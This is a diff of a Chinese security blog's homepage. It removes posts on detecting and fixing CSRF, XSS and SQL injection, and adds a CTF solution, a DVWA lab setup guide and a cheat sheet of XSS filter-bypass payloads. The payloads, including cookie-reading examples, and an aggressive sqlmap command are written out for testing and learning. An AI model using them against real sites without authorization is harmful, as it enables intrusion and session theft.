@@ -109,6 +109,8 @@
         
             <li><a href="%E5%B7%A5%E5%85%B7.html">工具</a></li>
         
+            <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
+        
             <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
         
             <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
@@ -136,174 +138,17 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15446869314706.html">
+                <a class="clearlink" href="15446978130922.html">
                 
-                  <h1>xss、csrf、sql注入快速检测方法</h1>
+                  <h1>enigmagroup入门挑战-基础1</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<h2 id="toc_0">CSRF跨站请求伪造</h2>
-
-<ul>
-<li>原理<br/>
-攻击者在受害者不知情的情况下，以受害者的名义伪造请求发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作。<br/>
-CSRF攻击的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-1.查看重要操作接口提交的请求中是否包含 csrf_token<br/>
-2.更改和删除 csrf_token 后提交表单，查看请求是否能被正确响应。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.对涉及数据<strong>增、删、改</strong>操作提交的表单中添加csrf_token，token 参数应校验一次后失效。<br/>
-2.最好是在容器或框架上<strong>全局</strong>启用 csrf_token。(很多框架自带的解决办法容易遗漏一次失效的问题)<br/>
-3.token 应有一定的<strong>时效性</strong>，建议为30分钟，过期需失效（即：单页面停留30分钟后，用户提交请求需提示“页面过期，请刷新页面后再次提交”）<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)">CSRF测试</a><br/>
-<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">跨站请求伪造（CSRF）</a><br/>
-<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">CSRF 攻击的应对之道</a><br/>
-## XSS跨站脚本攻击<br/>
-### 反射型</li>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-<strong>检测场景</strong>：任何有输入输出地方......<br/>
-1.使用通用的web扫描器一般的都能发掘潜在的反射型XSS漏洞。<br/>
-2.手工在一些输入框中或者post参数中加入拼凑过的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在。<br/>
-3.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的，反射型的XSS一般依赖于该次请求，且同时只能被用户自己所看到。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
-2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
-</ul>
-
-<hr/>
-
-<h3 id="toc_1">存储型</h3>
-
-<ul>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>检测方法<br/>
-<strong>检测场景</strong>：存在富文本编辑器的地方；用户的输入信息会作为固定的值回显到页面中；后台管理应用中维护用户输入的相关信息。<br/>
-1.手工在一些输入框中或者post参数中加入污染的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在(注入前端转义的情况)。<br/>
-2.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的。<br/>
-3.如果尝试注入的代码在页面中均被html编码，则再考虑其数据的流转会不会在后台其他应用中处理这些输入数据，如果有，对应的后台应用是否也做了完善的过滤机制。<br/>
-4.可远程搭建XSS检测平台，如果有XSS测试代码被触发，则自动发起链接到该平台上，这样相对来说可以测试那些未知的数据流向是否造成问题。<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/>
-1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
-2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
-</ul>
-
-<hr/>
-
-<h3 id="toc_2">基于DOM型</h3>
-
-<ul>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<p>没啥可说的，可以当成是特殊的反射型。</p>
-
-<ul>
-<li>检测方法<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>修复方案<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS跨站脚本</a>
-## SQL_Inject<br/></li>
-<li>原理<br/></li>
-</ul>
-
-<hr/>
-
-<p>开发人员使用直接拼接 sql 的方法来访问数据库，导致攻击者能通过特殊构造的语句控制代码逻辑。典型的代码与数据没有分离导致的安全问题之一。</p>
-
-<ul>
-<li>检测方法<br/></li>
-</ul>
-
-<hr/>
-
-<ul>
-<li>常规方法<br/>
-<code>
-1 ，新建一个1 .txt文件，burp抓包将包含关键参数的请求存入。<br/>
-2 ，使用sqlmap 进行扫描（python sqlmap [options] [file path]）<br/>
-3、等待结果输出
-</code></li>
-<li>另一种常规方法<br/>
-<code>
-使用burp插件SQLiPy<br/>
-方案一（通用）：将sqlapi地址配置成 192.168.2.22 2222<br/>
-方案二：使用sqlipy生成测试语句，然后添加 -p 参数，指定注入参数，然后在 shell 里面运行 sqlmap。<br/>
-一个指定参数的SqlMap示例语句：    <br/>
-sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- cookie = “SESSIONID = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br/>
---user-agent= &quot;Mozilla / 5.0（X11; Linux_x86_64; RV：60.0）/ 20100101火狐/ 60.0&quot;  --delay=0 --timeout=30 --retries=0 --dbms=&quot;MySQL&quot;  --os=Linux   <br/>
---level=3 --risk=3 --threads=2 --time-sec=10 -b --batch --answers=&quot;crack=N,dict = N&quot;  -p &quot;zone_id&quot; --tables           
-</code>
-我们在跑注入的时候需要重点设置的参数：<br/>
--risk=3<br/>
--level=3<br/>
---threads=2<br/>
---dbms和–os去问开发或者测试<br/>
--p 指定阐述减少服务器压力</li>
-<li>不太常规的方法<br/>
-1、写一个web界面调用sqlmapapi<br/>
-2、直接找开发拉代码过来进行审计</li>
-<li>修复方案<br/></li>
-</ul>
-
-<hr/>
-
-<p>1、使用安全的API ，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM 或实体框架(通常开发框架里会自带访问sql的方法来预防注入)。<br/><br/>
-2、做参数绑定，预编译查询。</p>
-
-<ul>
-<li>参考<br/>
-<a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
-</ul>
+                        	<p><a href="http://challenges.enigmagroup.org/basics/pre/1/">基础1题目地址</a><br/>
+1、右键查看源码<br/>
+2、ctrl+f查找passw<br/>
+3、注释里面说了：<code>&lt;!-- the first levels are easy, the password is 39f13b --&gt;</code></p>
 
                         
                       </div>
@@ -312,7 +157,7 @@ sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- coo
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/13 15:42 下午</span>
+                    <span class="date">2018/12/13 18:43 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -329,133 +174,132 @@ sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- coo
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15446876559011.html">
+                <a class="clearlink" href="15446897185202.html">
                 
-                  <h1>xssing.org跨站的艺术</h1>
+                  <h1>从零开始的DVWA之环境搭建</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>这个网站太棒了，强烈推荐阅读<br/>
-<a href="https://xssing.org/%E9%A6%96%E9%A1%B5">xssing.org跨站的艺术</a>若不能直接访问请使用科学上网工具。</p>
+<p>文章写于2017年7月6日，很久之前的东西了。</p>
 </blockquote>
 
-<h1 id="toc_0">什么是XSS？</h1>
+<h2 id="toc_0">0X01 主机配置</h2>
 
-<h1 id="toc_1">概述</h1>
+<p>　　操作系统：Ubuntu-Kylin-16.04-LTS_x64（VritualBox虚拟机）<br/><br/>
+　　相关组件：XAMPP+DVWA    </p>
 
-<p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击.</p>
+<h2 id="toc_1">0X02 DVWA简介</h2>
 
-<p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p>
+<p>　　DVWA是一个用来进行安全脆弱性鉴定（练习挖洞）的PHP/MySQL应用。旨在帮助安全爱好者（黑客白客红客白帽子黑帽子绿帽子等）测试自己的专业技能和工具提供合法的环境（不要瞎搞别人网站，这样不好...），提升技术能力的同时更好的维护比特世界的和平。       </p>
 
-<p>攻击者可以使用XSS发送恶意脚本给没有任何防备的用户。终端用户浏览器无法知道不应该信任叫嗯,而是执行了该脚本。因为它认为脚本来自可信的源,恶意脚本可以访问任何Cookies,会话令牌,或其浏览器和网站保留使用的他敏感信息。这些脚本甚至可以重写HTML页面的内容。更多的内容可以阅读本站其他内容。</p>
+<h2 id="toc_2">0X03 XAMPP简介</h2>
 
-<h1 id="toc_2">详细介绍</h1>
+<p>　　XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。由于DWVA需要PHP环境，嗯，就由XAMMP来守护了。    </p>
 
-<p>跨站脚本攻击在以下情况出现:</p>
+<h2 id="toc_3">0X04 XAMPP和DVWA安装</h2>
 
-<ol>
-<li>Web应用程序通过不可信的来源进行数据输入，最常见是的Web请求(输入，比如如GET访问某Web应用的url，通过参数提交数据,比如提交input=<script>alert(0);&lt;/ script&gt;)。</li>
-<li>恶意数据包含在动态内容内在没有进行校验的情况下发送给用户(输出，比如提交的input的值在没有校验的情况下，用户访问页面，浏览器直接渲染了input的值执行了JS，导致弹窗)。</li>
-</ol>
+<p>　　首先访问官网 <a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a> 然后点击下载：<br/><br/>
+<figure><img src="media/15446897185202/1.png" alt="1"/></figure></p>
 
-<p>发送到Web浏览器的恶意内容通常是以JavaScript代码的形式，当然也可以包括HTML，Flash或任何浏览器可以执行的其他类型的代码。基于XSS的攻击种类几乎是无限的，但它们通常包括发送隐私数据给攻击者，如cookies或其他会话信息；重定向受害者访问攻击者控制的页面；或者利用网站漏洞在用户机器上执行其他恶意操作。</p>
+<p>接着就会弹个框：<br/><br/>
+<figure><img src="media/15446897185202/2.png" alt="2"/></figure></p>
 
-<h2 id="toc_3">存储型和反射型XSS攻击</h2>
+<p>去一趟茅房回来就下完了，你要是嫌弃7下的太慢，可以去下5.6，速度会快些，接着就是安装。　　　　<br/>
+　　安装过程如下（记得加权限，然后）：　　　　<br/>
+<figure><img src="media/15446897185202/3.png" alt="3"/></figure><br/>
+　　　　<br/>
+<figure><img src="media/15446897185202/4.png" alt="4"/></figure><br/>
+　<br/>
+一直点击next就行了……　　　　<br/>
+<figure><img src="media/15446897185202/5.png" alt="5"/></figure><br/>
+　　　<br/>
+　　这里告诉我们XAMPP被安装在/opt/lampp文件（linux一切皆文件）里面。最后点击Finish就完成了安装。<br/><br/>
+启动XAMPP    </p>
 
-<p>XSS攻击通常可以分为两类：存储型和反射型（也称持久性和非持久性）。还有第三种相对少为认知的XSS攻击类型，叫做DOM XSS ,具体可以点击这里阅读。</p>
-
-<p>同时最近还有一种XSS攻击类型被提出来，突变XSS，不过个人觉得突变XSS不合适作为第四种XSS攻击类型，因为这种突变XSS可以出现在以上三种类型的XSS里，不过比较特殊，我们同样也在这里进行单独介绍（Fooying注）。</p>
-
-<h2 id="toc_4">存储型XSS攻击</h2>
-
-<p>存储型攻击是指那些被注入脚本将被永久保存在目标服务器上，比如在数据库中，在消息板块，访客日志，注释字段等。受害人请求存储信息时，将再次检索到恶意脚本(比如，在留言板提交XSS攻击代码，会存储到数据库，当再次访问留言板会请求数据库中的留言信息，就会连同XSS攻击代码一起检索出来在页面展示，使得受害者再次被攻击)。存储型XSS有时也被称为持久性或Type-I XSS。</p>
-
-<h2 id="toc_5">反射型XSS攻击</h2>
-
-<p>反射型攻击是指那些被注入脚本反射出Web服务器，比如在一个错误信息、搜索结果，或者其他任何的包括一些或所有的输入作为请求的一部分发送到服务器的响应。反射型攻击是通过其他途径送达到受害者，比如一封邮件的内容，或者一些其他的网站。当用户被诱骗点击一个恶意链接，提交一个特制的表单，甚至只是浏览到恶意网站，被注入的脚本行进到有漏洞的网站，将攻击反射回用户浏览器。然后浏览器执行代码，因为它来自于一个“可信”的服务器。反射型XSS有时也被称为非持久性或Type-II XSS.</p>
-
-<h2 id="toc_6">其他类型的XSS漏洞的</h2>
-
-<p>除了反射型和存储型XSS,其他类型的XSS，Amit Klein在2005年发现DOM XSS。除此之外，推荐关于XSS分类描述的文章：XSS分类，它涵盖了所有这些方面的XSS，组成了矩阵，存储vs反射型XSS，以及服务端和客户端XSS，DOM XSS是客户端XSS。</p>
-
-<h2 id="toc_7">XSS攻击结果</h2>
-
-<p>无论是存储型还是反射型（或DOM XSS）的攻击结果都是相同的。不同的是Payload如何有效的到达服务器。不要错误的认为，一个“read only”或“brochureware”网站不容易受到严重的反射型XSS攻击。XSS可以引起终端用户的各种问题，包括不同的严重成都。最严重的XSS攻击涉及用户的会话cookie的披露，使攻击者劫持用户的会话和接管帐户。其他破坏性攻击包括终端用户的文件披露，特洛伊木马程序的安装，将用户重定向到其他网页或网站，或修改内容介绍。XSS漏洞允许攻击者修改新闻稿或新闻项目可以影响一个公司的股票价格或减少消费者的信心。一个药品网站XSS漏洞可能允许攻击者修改剂量信息导致过量。更多关于这些类型的攻击请看内容欺骗。</p>
-
-<h2 id="toc_8">如何确定存在漏洞</h2>
-
-<p>XSS漏洞比较难以识别和从Web应用程序中删除。发现漏洞的最佳方法是进行的代码的安全审计，搜索一个HTTP请求中可能进入HTML输出的所有输入点。值得注意的是，各种不同的HTML标签可以用来发送一个恶意的JavaScript。Nessus, Nikto以及其他的一些扫描器，可以用来扫描检测XSS，不过效果有限。如果一个网站的某部分存在漏洞，那么很有可能还有其他的问题。</p>
-
-<h2 id="toc_9">如何防范XSS</h2>
-
-<p>XSS防御的相关内容位于OWASP XSS防范备忘录 .</p>
-
-<p>另外，最主要的是关闭掉你所有Web服务对HTTP回调的支持。攻击者可以窃取cookie数据通过JavaScript，即使document.cookie被禁用或不支持客户端。用户可以在论坛发布一个恶意脚本，当其他人点击链接，异步回调请求就会被触发，用来收集来自服务器的用户的cookie信息，然后发送到另一个接收地址，这样攻击者就可以进行一个会话劫持攻击。关闭掉你所有Web服务对HTTP回调的支持是很容易的。</p>
-
-<p>OWASP ESAPI project已经开发了一套可重用的安全组件。包含多种编程语言，包括验证和转义来防止参数篡改和XSS攻击注射。此外，OWASP WebGoat Project训练应用，有跨站点脚本和数据编码的训练经验。</p>
-
-<h2 id="toc_10">XSS语句</h2>
-
-<p><strong>属性中使用脚本的XSS</strong><br/>
-XSS攻击可能在非<script></script> 标签中发生. 其他标签也可以做同样事，比如:</p>
-
-<p><code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code><br/>
-或其他属性，如:onmouseover,onerror.onmouseover</p>
-
-<p><code>&lt;b onmouseover=alert(&#39;Wufff!&#39;)&gt;click me!&lt;/b&gt;</code><br/>
-onerror</p>
-
-<p><code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code></p>
-
-<p><strong>利用XSS脚本通过编码的URI方案</strong><br/>
-如果我们需要绕过Web应用过滤器，我们可以尝试编码字符串，比如：a=A (UTF-8),在img标签中使用：</p>
-
-<p><code>&lt;IMG SRC=jAvascript:alert(&#39;test2&#39;)&gt;</code><br/>
-有许多不同的UTF-8编码符号可以给我们更多的可能性。</p>
-
-<p><strong>XSS利用代码的编码</strong><br/>
-在META标签，我们可以对我们的脚本进行base64编码，这样就不用输入alert()字符。这个方法的更多信息参考RFC 2397</p>
-
-<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; <br/>
-CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt;</code></p>
-
-<p>这些以及其他的例子可以在OWASP XSS Filter Evasion Cheat Sheet查看。这是一个真正的备用XSS攻击代码的百科</p>
-
-<h1 id="toc_11">例子</h1>
-
-<p>跨站点脚本攻击可能发生在任何地方，可能是恶意用户被允许发送非规范内容到一个可信的网站给其他合法用户。最常见的例子发生在网站公告板，提供基于Web的邮件列表的功能</p>
-
-<h2 id="toc_12">例子 1</h2>
-
-<p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. 下面的JSP代码块从一个HTTP请求读取employee ID, eid，并展示给用户。</p>
-
-<pre class="line-numbers"><code class="language-text">    &lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; 
-    ... 
-    Employee ID: &lt;%= eid %&gt;
+<pre class="line-numbers"><code class="language-shell">#cd /opt/lampp
+#./manager-linxu-x64.run
+或者
+#/opt/lamp/./manage-linux-x64.run  
 </code></pre>
 
-<p>如果eid仅包含标准字母数字文本，则此示例中的代码可正常运行。如果eid具有包含元字符或源代码的值，则代码将在Web浏览器显示HTTP响应时执行。</p>
+<p><figure><img src="media/15446897185202/6.png" alt="6"/></figure></p>
 
-<p>最初，这似乎不是一个漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的URL？真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者点击该链接时，他们会无意中通过易受攻击的Web应用程序将恶意内容反映回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。</p>
+<p>下面我们开始安装DWVA：<br/><br/>
+　　首先我们登录官网 <a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a> 点击DOWNLOAD下载最新版的DWVA，是一个zip文件。<br/><br/>
+<figure><img src="media/15446897185202/7.png" alt="7"/></figure></p>
 
-<h2 id="toc_13">例子 2</h2>
+<p>然后将文件解压（提取）到/opt/lamp/htdocs/目录下<br/><br/>
+<figure><img src="media/15446897185202/8.png" alt="8"/></figure></p>
 
-<p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee&#39;s name.</p>
+<p><figure><img src="media/15446897185202/9.png" alt="9"/></figure></p>
 
-<pre class="line-numbers"><code class="language-jsp">    &lt;%...
-     Statement stmt = conn.createStatement(); 
-     ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid); 
-     if (rs != null) { 
-      rs.next(); 
-      String name = rs.getString(&quot;name&quot;); 
-    %&gt; 
-    Employee Name: &lt;%= name %&gt;
-```
+<p>接着我们打开XAMPP的MySQL（默认只开了Apache）<br/><br/>
+<figure><img src="media/15446897185202/10.png" alt="10"/></figure></p>
 
-以上，是首页的部分内容，首页还有很多的参考链接，这些链接都非常有价值，可是不好copy，所以请读者自行前往原网站欣赏。
-</code></pre>
+<p>然后访问 http://localhost/DVWA-master/index.php 诶!?报错<br/><br/>
+<figure><img src="media/15446897185202/11.png" alt="11"/></figure></p>
+
+<p>　　嗯，根据报错信息可知是配置文件有问题（废话啰），同样的根据提示我们知道要将文件名config.inc.php.dist改为config.inc.php（这里其实涉及到一个linux命令copy的用法，具体可自行百度： <a href="http://www.linuxdiyf.com/viewarticle.php?id=38590">http://www.linuxdiyf.com/viewarticle.php?id=38590</a> ）。改完名字之后就可以访问了，页面会自动跳转到： http://localhost/DVWA-master/setup.php 。然后我们用gedit打开这个文件config.inc.php看看是个什么东西，(⊙o⊙)哦原来是配置文件（废话连篇有木有），我们修改两个地方（1、数据库密码，我知道玩lol的你输入这个密码肯定飞快，不过我是玩dota的。2、安全等级设置为low，简单点容易玩，默认是难的。）     　<br/><br/>
+<figure><img src="media/15446897185202/12.png" alt="12"/></figure></p>
+
+<p>打开之后长这样：<br/><br/>
+<figure><img src="media/15446897185202/13.png" alt="13"/></figure></p>
+
+<p>怎么玩呢？我不知道啊，于是我瞎点了几下，<br/><br/>
+<figure><img src="media/15446897185202/14.png" alt="14"/></figure></p>
+
+<p>MMP又报错了，根据提示我们知道问题出在red部分,嗯，我们去修改一下所有带红色的地方的配置。<br/><br/>
+1、搞定PHP function allow_url_include：Disabled<br/><br/>
+找到php的配置文件，修改allow_url_include=Off 为allow_url_include=on（参考<a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include%EF%BC%89">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include）</a><br/><br/>
+<figure><img src="media/15446897185202/15.png" alt="15"/></figure></p>
+
+<p>然后修改/opt/lamp/etc/php.ini<br/><br/>
+<figure><img src="media/15446897185202/16.png" alt="16"/></figure></p>
+
+<p>2、解决reCAPTCHA key，配置文件里面有个谷歌连接，点进去剩下的估计你也看得懂应该知道该怎么做额。<br/><br/>
+<figure><img src="media/15446897185202/17.png" alt="17"/></figure></p>
+
+<p><figure><img src="media/15446897185202/18.png" alt="18"/></figure></p>
+
+<p>3、解决最后的两个NO<br/><br/>
+<figure><img src="media/15446897185202/19.png" alt="19"/></figure></p>
+
+<p>我们给这两个文件加权，运行命令：<br/><br/>
+<figure><img src="media/15446897185202/20.png" alt="20"/></figure></p>
+
+<p>然后点击<br/><br/>
+<figure><img src="media/15446897185202/21.png" alt="21"/></figure></p>
+
+<p>纳尼!?<br/><br/>
+<figure><img src="media/15446897185202/22.png" alt="22"/></figure></p>
+
+<p>只好回头再看看XAMPP的数据库配置文件，你会发现他的password默认是被注释了，我们取消注释。<br/><br/>
+<figure><img src="media/15446897185202/23.png" alt="23"/></figure></p>
+
+<p>最后你会发现不管怎么搞还是报错……这就尴尬了……<br/>
+经过尝试，我发现以下配置可以进入登录界面。<br/>
+XAMPP配置如下：<br/><br/>
+<figure><img src="media/15446897185202/24.png" alt="24"/></figure></p>
+
+<p>密码还是按照默认的注释掉<br/><br/>
+<figure><img src="media/15446897185202/25.png" alt="25"/></figure></p>
+
+<p>DVWA配置如下：<br/><br/>
+<figure><img src="media/15446897185202/26.png" alt="26"/></figure></p>
+
+<p>接着你就能进入登录界面了。恭喜！<br/>
+http://localhost/DVWA-master/login.php<br/><br/>
+<figure><img src="media/15446897185202/27.png" alt="27"/></figure></p>
+
+<p>输入账号密码然后登录就能愉快的玩耍了。<br/><br/>
+<figure><img src="media/15446897185202/28.png" alt="28"/></figure></p>
+
+<p>什么？你进不去？账号密码是什么？预知后事如何，请听下回分解。    </p>
+
+<p>下集预告：<br/><br/>
+　　欢迎来到DVWA的世界，这是你的第一关，登录破解…… </p>
 
                         
                       </div>
@@ -464,7 +308,7 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/13 15:54 下午</span>
+                    <span class="date">2018/12/13 16:28 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -481,22 +325,105 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15453709108643.html">
+                <a class="clearlink" href="15446893463166.html">
                 
-                  <h1>python弱口令脚本的一点备注</h1>
+                  <h1>xss常用payload</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>很久以前写的</p>
+<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
 </blockquote>
 
-<p>跑弱口令的脚本<br/>
-不要使用字典这种操作，这不利于跑大量数据的场景。<br/>
-应该制定规则去跑，比如：<br/>
-取出一个用户名，然后根据规则生成弱口令，然后再去匹配用户名对应的密码，匹配则是弱口令，不匹配则不是弱口令。<br/>
-这样可以后续变成一个服务，用户输入密码，触发了规则则告诉他密码是弱口令。</p>
+<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
+
+<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
+
+<p>1.大小写混合绕过<br/>
+顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
+
+<p>2.闭合标签绕过</p>
+
+<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
+
+<p>3.HEX编码来绕过</p>
+
+<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
+
+<p>4.Javascript URL</p>
+
+<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
+
+<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
+
+<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
+
+<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
+
+<p>===&gt;常用代码如下：</p>
+
+<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+
+<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
+
+<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
+
+<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
+
+<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
+
+<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
+
+<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
+
+<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
+
+<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
+
+<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
+
+<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
+
+<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
+
+<p><code>&lt;body/onload=alert(12)&gt;</code></p>
+
+<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
+
+<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
+
+<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
+
+<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
+
+<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
+
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
+
